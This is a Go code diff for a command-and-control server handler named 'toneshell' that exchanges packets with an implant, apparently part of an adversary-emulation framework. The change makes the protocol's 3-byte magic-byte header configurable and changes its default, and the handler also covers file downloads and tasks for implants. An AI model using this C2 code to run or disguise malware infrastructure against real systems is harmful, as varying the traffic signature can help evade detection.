@@ -24,8 +24,7 @@ import (
 )
 
 const (
-    HANDLER_NAME    = "toneshell"
-    MAGIC_BYTES_STR = "180404"
+    HANDLER_NAME = "toneshell"
 
     MAGIC_BYTES_SIZE         = 3
     ENC_KEY_SIZE             = 256
@@ -47,7 +46,7 @@ const (
 )
 
 var (
-    MAGIC_BYTES = []byte{0x18, 0x04, 0x04}
+    MAGIC_BYTES = []byte{0xC7, 0x3A, 0x1F}
 
     // File upload / download default paths
     DEFAULT_PAYLOAD_DIR = filepath.Join(filepath.Dir(util.ProjectRoot), "payloads")
@@ -121,6 +120,7 @@ type ToneshellHandler struct {
     listener   net.Listener
     payloadDir string
     encType    int
+    magicBytes []byte
 }
 
 type WrappedFuncHandles struct {
@@ -181,6 +181,22 @@ func (o *ToneshellHandler) StartHandler(restAddress string, configEntry config.H
         }
     }
     o.encType = encType
+
+    // Get magic bytes for the handler, default to package-level MAGIC_BYTES
+    o.magicBytes = MAGIC_BYTES
+    magicRaw, ok := configEntry["magic_bytes"]
+    if ok {
+        magicStr, ok := magicRaw.(string)
+        if !ok {
+            return errors.New("magic_bytes configuration value must be a string")
+        }
+        magicStr = strings.ReplaceAll(magicStr, " ", "")
+        parsed, err := hex.DecodeString(magicStr)
+        if err != nil || len(parsed) != MAGIC_BYTES_SIZE {
+            return errors.New("magic_bytes must be a 3-byte hex string (e.g. \"c73a1f\")")
+        }
+        o.magicBytes = parsed
+    }
 
     // Get the payload directory for file download
     o.payloadDir, err = config.GetHandlerPayloadDir(configEntry)
@@ -549,7 +565,7 @@ func (o *ToneshellHandler) HandleFileDownload(implantPacket ImplantPacket, sessi
     }
 
     // Set magic bytes
-    resp = append(resp, MAGIC_BYTES...)
+    resp = append(resp, o.magicBytes...)
 
     // Set packet size
     packetSize := make([]byte, PACKET_DATA_SIZE)
@@ -666,7 +682,7 @@ func (o *ToneshellHandler) ConvertTaskToResponse(sessionId string, packetType by
     var resp []byte
 
     // Set magic bytes
-    resp = append(resp, MAGIC_BYTES...)
+    resp = append(resp, o.magicBytes...)
 
     // Compile response
     if packetType == HANDSHAKE_REQ {
@@ -715,7 +731,7 @@ func (o *ToneshellHandler) ParseImplantPacket(data []byte) (*ImplantPacket, erro
 
     // Check for magic bytes, drop packet if they don't match
     data_magic_bytes := hex.EncodeToString(data[:MAGIC_BYTES_SIZE])
-    if data_magic_bytes != MAGIC_BYTES_STR {
+    if data_magic_bytes != hex.EncodeToString(o.magicBytes) {
         return nil, errors.New("implant packet does not contain correct magic bytes, packet dropped")
     }
 
